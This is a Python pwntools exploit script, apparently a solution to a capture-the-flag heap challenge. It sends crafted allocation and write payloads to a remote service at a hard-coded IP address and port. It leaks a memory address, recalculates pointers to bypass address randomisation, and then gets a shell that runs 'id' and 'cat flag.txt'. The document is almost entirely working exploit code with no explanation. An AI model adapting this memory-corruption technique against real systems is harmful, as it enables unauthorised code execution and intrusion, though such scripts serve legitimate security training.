payloads = [b'b\n', b'0\n', b'256\n', b'j\x97b\xae\xbfD\xd5\x9a/#*(~8Z\x02g^\x1e\x99\xae\xb5\xcd\xd7\x0flv \xaf+\xf1~"x\xa4$]E\xcb\xb4=\xb6K\xee\xf1\x11\\\x94\x9ba~\xa4b\x0f\xac\xb4\xbd\x0c\x14,\x0ee\xa9\xfcST\xce\xcc\x9f[i\xdf\x89\xd9\xf4\x9a9\x86i\xfe\xc5W\x16\xd1i\xc7\xe20\xe4\xb6\x16\xaa~~\x8c>S\xc5\x97J\xceH\xbc\xf8:\x95\x11\xf8i\x94\xd0\xdf\xab~G\x07\xb2\xf6\xf0~M\xebN>\xdf\xdf\x87\x9bJ\xfdib\xe6\x9e3\x1e\x88\x7fj\x0b:P\x8b\x03<\xc0\r|\x10\x99\xab?\\\xcc\x82\xa2\x18\x16\xf3\xb2#\xf1\xbc\x04\xae\xf4\x9c\x19\xd9\xe0x\x0b{C|j\x0c\xbf\xf81l4\xb5J\xa8HD\xa5\x10\xbb\xc9\xf7W\xac^\xc4\xb9\xe1\xe7H\x8e,\x8a\x10n`p\x8dOp\xae\xae\xd3\xcb\x07\x91\xd6\x89m/\x9d\xb6\x9d\x0c\xcb\x06c\x87\x92?\xd1\x85\x81p\xbe\r7m\x94\t3\xfc\xf5\xd6(\xd7\xd3\xcb\xcdp2\xb1l\x82\x1d\n', b'b\n', b'1\n', b'256\n', b'\xc3\x89*NV\xcf\x12\xfe\x92]#e\xa4\xa9%\xfb\x8d|\xae\xdb\xf2Dv\xfe5\x92\x14\xd4R2\xbea\xa2\x8d~\x91\xe5\x0fS\x95\x1d7P\xba\xc3\xee}\xab\xfc\\Q\xc0\xa8\x0b=$\x16\xca\x1d\xee\x04#\xf4\xa4\xe5lr\x01\x0e\x06BF\xd9\x85\xd5v\xa5\x99\xca\x17\x8aS\x06(\xc7\x1c\x1e\x0b\x896\x8c\x04\xe4\xd1\x07\x1b\xdf\xd0]\x064\x0e\x1e\x05\xc14p\xa0\x94M\xb8\xae\x9a\xad_\xd1\xce\x99e\xa8\xa8\x8c\x06D\x01\r\xa3\xc6HG\xddu\x8fU\xb4\x18\x06\x90\xe5\xcd\xc7\x1eB|\xf5\x9a\x82\xc1\x81E\xcb\xd8\xe4\x82\xd4\xaaT\x109\xc2\xe8\x96\xbd\x992\x8a&`b\r\x84\xc2\x93OsS\xa7d\x89\xdf\xa3\t>\x11\xa8A\xcf (,\xb3\xc9\xe26\xb5\xcf\xeb\xb4\xcd\xbc\xa7\x18\x9a\xcc\xeaWz\x03\x83\xa6\'H\xd8\xbd\x0e\x91V&\x9aZ%\xdd\xdc\xe2*v\x05"\x11@Z\t\xcfQ\xb4\xd4n\x19kV\xb2\xdf\x9c\xcc~!\xa9V+\xbc\xc3%\xa9\xa3\x08\n', b'b\n', b'2\n', b'256\n', b"h\x16\x14O(\xdb2\x9b}6XU'M\xc6\xd3\xde4\xc0\x83\xd5\x81k\xd0\xf9x\x10P\x88\xcd>=\xbe\xfbS\xd2fs\xe6C\xf4\xae\xdc\x99\r7~B\xa3\x7f\xe0q\xc0U\xe0\xed8%F#\xa5\xb5,\xa1\x1a\xf0\x0cCh\x9a\x8a\x85k\xe6}\xceX+\x94\x88\xde\xa1*I'\xb2\xda\xde>!p\xfbqEl\x0e\xd1C\x1e\x06i\xba\xf7\xe7<cY\x0e\x95=\xb7V\r\xdf\xa4\xcc\xe0\x0f\x11*q_\xf3=\xc2q\xbb\xa7\x91\xa1>\x7f\x16\xc1\xac\xc1\x98\xc55[\x15\xab\xc5\xf3\xbf\x83\xa13\xf8m\x0c\xbf\xc4K5\xc4\xfa\x1f\xd6\xf5\x06h\xd0\x8bw\x04\x92\x12Y\xb9\xe7\x1f\x88\xa2\xdcA\xfa\xa5\x12\x9cJ\x82\xbd#T\x17n\xebE\x97h\x1c\xad/\x8d\xdf\x9do\x8f.\x15\xb8\xe2>\xa7&U\x06\x0f\x8c<\x08E\x03\x12L\x1e2\xe7\xc0\xf0\xcf8,Ne\xf9\xf7|v\xdck;n\xdd\xdfni\xa7\xd2z\xcc\x0f\xa4\x83A\x0e}\xfd\x90\x1b\xd1^|E\n", b'b\n', b'3\n', b'256\n', b'\xc9\xf3)=\x05\xcePU\xe2_\xc47L\xe3R_\xf4">Y\x98}f\x9f\xd2\x1f\x81z;B\xa2`1E\xe4\xe6Y\xe5fM\xd3\x00\xa9\x86j\x9d\xaa\x14vR\xef\xbcH\xc4\xf0\x021\x95\x00l\x81\xf2\r\xe8B{lz\x94\xe8q\x08-ETh\xe7\xcd%\x89cV\xd9\'o&C\xb7\xeak\r\xc8\xed\xc6\x89\xf32\xe5\x98\xb7o\xfez\xbas\x17*\x02\x835\xf8{\x0c\xdc\xa7\xfd}Z\xdb\x81#K\xe6\x02\x01\xf8l\x8e\x8f}\x0b=\x88\x1c\x1az\xe28t\x84\x1b#\xfc\x18#\xe6f\xb2M6\x1f\x80\xbdJ\xa1>\xf2-\x1f!=\x18\xf9\x8d\xba\xe7\xbc\xa6: -\xb0K\xe7\xaa\x01\x1db\xcb\xf8(t\xa9\x98\xdb\xc9\x9dp\xe84V\x15Fi M_%S\xc5\x90\xbd\xc6\xee\xa8J\xe2P(A\xc7\xf6\xfa\xb6D?>$\x0c\xb8s\xb2\xd3\xf5\xb3?\x1f\xe9k\x99b\x92\xb87\x0b\x01\xcc\x89\xdc\xa5F\x85\xe3oz\xea\x0e\xb8$i\xebo\t7\xec\n', b'b\n', b'4\n', b'256\n', b'K\xbd\xe5\xe6\x81\x1d\xac\xb6!M\x8a\x16\xf4\xd9\xd2\xa7\xd0|\xcd\xb4$\xa8@"\xa8\x9a\x10 \xe0I\x90#\x9a\x9f\x97x?a6\xc6\x91P\x94\x0c\xef\xdb\xc1\x9a\xd1ivi\x86Qi|!\xf9\xd5\x81\x05`\xbc\xa2\x10D\xefR\xb12\xc8p\xfe\xd52\xd953\xe4<\x0f$\xe5$\x0f\r\x02\x08}\x19\xa6\x8a)\x026H\xca=*\xe7\xb8+\x87[\xe5\x88\xd0\x10\xf4\xf5\xd1\xa1\xba\xdf\x0fa\xb5\xea\xe13\x95w_\xa3\xf1\x99\x10\xe1!-;\xa5\xf2\xce\x04At\x95[\xc8\x9d\x12mOc\x15\xc9V\xef\xd7Qd5\xec\x8f%\')\xecV\xb9\xb2\x86\'\xb8\xfc\xdb\xf3\x0c[\x03\xf8\xb3\xd9\x10o~\xcdf\xddM\xea\xda\xc9\xc6x\xccg%N\x82\xef\xf1\xef+4S\x87i\xdfI\xdbA\x1e\xba\xb8\xa6H\x00\xa8ZN\xe4\xc20Z#\x13P\xb6\xbca4;\xf3\xe2\xa2\x8esg\xef\xa8M\xe7+\xaa\x8f*\xa7\xc8\xa1\x053\x06\xa9\x89\x16-\xa0<\xfd\xa5Ex\x99\n', b'b\n', b'5\n', b'256\n', b"\xc8\x8a\xd94\xbe\xc6\xd6\xe3\x9c1\xe4\x9c\xd8aj\x14\xca\xb3\xe9\xbc\xf8\xc7\x94\xaf\x17.\x9f\xcc\xe9\x11'F\xe4\x9f\xdc \xee,\xb5m\xda\x80C\xae\xc0\x96z\xf3\x9f\xca\xef\xa4\xf2\x13\x05\x18\xb4\x14\x15\x07\x05\x90N;\xaf\xec\xa5\xadA\xa68O\xa0J\xf0\x08\xdf5&\xbfS3\xf6\xcbI^\xc0=C\xc6\xe3\x0b\xe3\xbe\x1a\x1b\xaei\x12h\xf9\xeb`L\xdd\xc7\xc7\xd9\xd6\x9f\x12\x06\x90<\x93\x85z\xac:S\xdfy3N\x15=\xbc<\x18\xd0#E_\xb9\x16\x94zFn\xcbg\x9e\xd6FvEyJ\x86a\xba\xa0~\xc6d\x91\xbb\x96\r\x84\xdc)\xe02\xe4\xe6l\xd6\xf9\x10\x80\xce\xc8\x9e\xcdG\xc7\xb0\xda\x12\xf1\x9b\xaa\x9f\x7fe\x00\xe5\x8bU\xa3\xa3O\xc3\xbe\xd3\xe2\x99\x925\xa3\x8c\xc0\x13\x05\x80d\xad@\xed\xc0\x08n*\xde\x1cCq\x15\xa1\x01\xe4\xbb\x81\x1fsb\xeaN)\xf0\x82)\xf8\x08\x0cN\xcc\xe1\xf9&\xaf\x8e\xc0_La\xdf*\x89\xe2N\xad\xc9m\n", b'b\n', b'6\n', b'256\n', b'\x14\x1e\xa51\x1a\x1aL\x9a\xde\xf3\xbe\x9a\xae\x05Q\xa0\xe3\xb3\xfcU\xcb5\x87\x89|\x101\xc8K7\xe7r\x10\xcf\xdf\x9e0\xb9\xbbZ\xf2\xf7\xcf\x9c\xe7\x8eEt\xb3 \xd2\x17 \xcc\xca\x15\xd6\xdd6\x8a\xb7\x89\xacb\x86\x9d\xf4p\x94\\`\xdb\xa3\x10>\x9f\xcf\xa0&\xb0"\x8b\x95~A\xa1Cu\xd8\xa1\x81\x10&\x90\x9bz\xa7C\xd3\xaf\x8e\x1a\xd1\x02\x1bR1\xf0\x1a}\x9d\xa6\x19~\x9d\xe6;?Z\x88\xea\x8a\xd0O\xa5\x92K\xb3\xb9Ao\xb3q`\x9f\xb7\xd6\x88\x94^n\xf1\xddi\xd1\xd9\xfd\x87\xc3\xdd\xc7\x00+\xbe\xca\xb5\xa0\xaa\xa2rX\xbc\xd2\xbc\x0fKa\x01jv*\xce4\xa4\xf6@-\xe2T\xfe\x06\x9e[\x95,\x03\x97e&\x03\x85\x0f\xb9\x08J\x97\xad\x90\x8ec\xea\xc2\xdcC3&\x12\xcf\xd7Aa?6$a\xcco\x1a\x0b\x10\xd9\x8d\xd8z4?Jp\xb77\xd9\xbe\x9f\x0fJ;\xaae\x03T\x12]*\xc8\x99\xbd\x0c\xca\xeex\xb7A\x0c5p\n', b'b\n', b'7\n', b'256\n', b'\x9d\xcf\xac\\On\x99\x85\xc76\xe8\xfdgxE\xc5V\x8d\'0\xd8\xb2\xebV\xa68[5\\8\x1d\xf7\xd5\x01\x1b\xdc\x9a1\x1e\x07\x96<\x07\xf8dr\x19\xaeBX\xceY\xe2\xee\x86\t\xd2\xd9\x88+\xf3#\x1b\x04d\x05\xd2\x82q\xa4s\xc4\xf6\xef\x1c^>s>\x90\xb7q\xb8\xcdg\x80K\xa8\x1a\xf56AR\xd6k\x8a\xe0\xc9\xceu\x12\x06\x13\xfd\x9f\x06\x8cL\x82?9G\x9d\x1a\xf1\xf3\xcd\xeb-7,\xac\xd2a\xc6\x8fg\xfb\x97\xca\xed\xc4k\xbf\xd5t\xdc?\xe2\xb4lm\x03\x82WCO\xd3\xfc\xab\x06\x16\x83\xb0s\x95\xfe\t\xba{9\x00\x94.\xab\xc3[K\xe9B\x07bA\x97\x83x\x1e\xa9\x9a\x01\\=\xd0\xd36\x1e\x18E~Iq\xacV\x7f\x1c\x06\xd9|\xe7m\x9cL\xf8\xc6\x18\xcd\x95\xb9\x98"IN\xf1\xf8\xda\x04s\xf63n>\xe1\xfd\xbe\xce\xbf\x9c\xe6\x88$\xe7\xd6\xe3\x17.,\x0fX\xb71\\\xea\xb0J]<Z\xcb$\xf6\x001\x0c\xf2\xd5\n', b'b\n', b'8\n', b'256\n', b'\x0e\xce\xd8E\xa2\t\xcc\x81\xa9\x86\xa1\x03\t\x17\xde\xce\xad-\xb4J`\xa7=\xe4r6!XJ~\xf5!U\xb0\x04I\x90\x96\x08n\xe5k\xcd\xdb\xe7\xfd\xea\xda\x18bz\xc5\xbf{\xb7("@%\x14\x8fk\x95V\xdf\xf0$\xc65#\x84\xd1]\xa3\x12L\xa7\x1b-\xb7#bh\xef&\xbd\x8f\xa2\xae\xb2J\xda\xe9\xa0B\xc9\xfe\x836\x17L\x81\x9aC\x95\xb1\xf3\x05\xecH8g\xb6\x00i\xe6\xf6/\x11(\x94\xb6H\xd9\xdf\xea\x9a`\xde0=D\xce\x93\x00\xcb<I\xef{\xfc\xf4\x93*\xa0x[\xaa\xa8O;\xf1\xe8]\x8a\xb8\xde\xcd:! vp~\xaac\xf8\xe1;\r<\xae\t)\x165\xaaL\xa3s\x98\xb5\x87\x85\xcby\x07\xea\xe9\xdd\x8f\xb45.~\x17\x0f^\xfa\xc0\x9f\xfc\xc61E\x86}A\x94I\x1d\x02\xd4\xf9\xc2\xd9\xc4t\xf3\x11\xb2\xca\x00m\x86\x80\x9c\xe0\xc3\xca\x81\xba\xae\xcfC\xb1\xbe\xa3\x07\x0c\x18\xc1\xca\xc9\xd4\xe5\xcf7\xc9E\x80\xec\xd6\xac\xa2\n', b'k\n', b'0\n', b'k\n', b'1\n', b'k\n', b'2\n', b'k\n', b'3\n', b'k\n', b'4\n', b'k\n', b'5\n', b'k\n', b'6\n', b'k\n', b'7\n', b's\n', b'7\n', b'm\n', b'6\n', b'(\xdb\xcf\x7f/\x7f\x00\x00\n', b'b\n', b'0\n', b'256\n', b'sh\x00z\x7f\xcb\x8e\xdb\xb0\xd1\t-kW\xe2\x8b"{\xb3\xdf\xbb;o}\x89y\x16\xd1\xbe\xc09\xebk\xbb#\xdb"8\xed\xd7\xad\xb5\x8c\x8b\xa8\xa4\x95\xc4L\xa1\xd2\x8ah\'\xf5p\xf19\xac,x\x14r\x17\xbd\xea\xdf`\xe3vg\x0c\xd75\xdc5\xc20&\xf1\xb7\xa5T7\r\xcb\x8ff\xbc\xa2\xda\x1f\xfc\x9a\xb1\xfd_5\xdb8@\xf9\xb7\xf5\x95\xd8\xcb_\'\x90@\xeb<\xadu\xc0\xd2\xfb\x94\xf2G\xf7\x9eE\xb2>\x84\xb36WY#\x8c\x86B\xa7j\x99\xf81\x14%"`\xe3\xdb\xa8\xb7\xd2A\xf3\t\x9dr\x9e\\\x8a\x06\xf3\xda\xbeX\x8f}\xc6\xf8\xcf\xa0G\x1a5\xdf>\x0eg\x1b\xaf\xa2\xa7@581FZ(\x164\x95W1\xfeZ8x\xe4\x06\xe9K\x19\xd8Oxn\xe3+\xe2(e\x97\xe6zM\xb8I\xd0\x7f\x05\xef\xca.\xce\x1e4\x0c\x84\xfc\x83\xeb2\xc35\x12e\x98\xa9\xbc\xf5\x88\x07\xcbC\xe3\xbb\x10\xd2\xfbI\x91``[Or\xc9\n', b'b\n', b'1\n', b'256\n', b'\x10D\xb6\x7f/\x7f\x00\x00q\xd1\xb1\xbd\xa3y\xe6\xc5\xcd\x9f\xd4I=\xcd8U39\xe7\xcd\x92\x05\xbc\x14\x0f\x8a\xab\xfd\x905\x15+\xdc\xd7*:\xd3h\x1e\x08\xc3Z\x90K\xf7\xf9 \x85`\x83\x9d\x08\xed:\x9e4\xde2B/\x96\xb2\xf5\xcbjc\xc4\x89>}=2S_\xc9\xbf\xd2\xb4\xf0`\x87\xb9\xb5\x17O6\x05\r\xbd\x0bE\x1d\xa4\xf2m\x19X\x1b\x9cg\xaa~\xd87\x95K\xf3V\xdb.Neu^\xb1\xeb\xb1\xec\xb3ve\x07\xa5\xec\x88\xcd\x806T1\x9ar\xf9)\xcf\xa0\xce\xda\x96\xeb\xc3s\xd3R\xd3\xfa\xecI\xfb\xfa\xfa\x01-?j\xeb9#\xb3\xda\xa6M\xfa\xaa\xcdl\xc4\x9c1\xdbT=<\xe7\x99o\t\x16\xc2\x1e\x11E\xce\xdfI+\xeb\x96\x8c\x9a\x0e"\x01\xcdd_\xdaJ\x8f\x06\x01.\xc9L\'\xda/P\xd3\xed\xfcr\xae\x88[\xe0/<Q\xb9\xd8\x82\x8cI\x82\x12\xf5^\xbc\x15\x06#s\xf0\xf4\x1e\x94\xeco%\xca\x96\xef\xf7\x84\xb9\x1e\n', b'k\n', b'0\n', b'id\n']
print(len(payloads))

for i, p in enumerate(payloads):
    print(i, p)
from pwn import *
HOST = "192.9.137.137"
PORT = 42067

conn = connect(HOST, PORT)

for i, d in enumerate(payloads[:54]):
    print(conn.recv(timeout=1))
    if d[0] in b'bksm':
        print(conn.recv(timeout=1))
    print(f"> {d}")
    conn.send(d)

leak = conn.recvuntil(b'\n')
print(leak)
print(leak.hex())

#         leak          -  real
offset = 0xe0abcf7f2f7f - 0x28dbcf7f2f7f
print(int(leak[:-1].hex(), 16))
print(offset)
payloads[56] = (int(leak[:-1].hex(), 16) - offset).to_bytes(6, 'big') + b'\x00\x00\x0a'
print(payloads[56].hex())

offset2 = 0xe0abcf7f2f7f - 0x1044b67f2f7f
print(offset2)
change2 = (int(leak[:-1].hex(), 16) - offset2).to_bytes(6, 'big')
print(change2.hex())
payloads[64] = change2 + payloads[64][6:]
print(payloads[64].hex())

for i, d in enumerate(payloads[54:]):
    print(conn.recv(timeout=1))
    if d[0] in b'bksm':
        print(conn.recv(timeout=1))
    print(f"> {d}")
    conn.send(d)
conn.sendline('cat flag.txt')
conn.interactive()
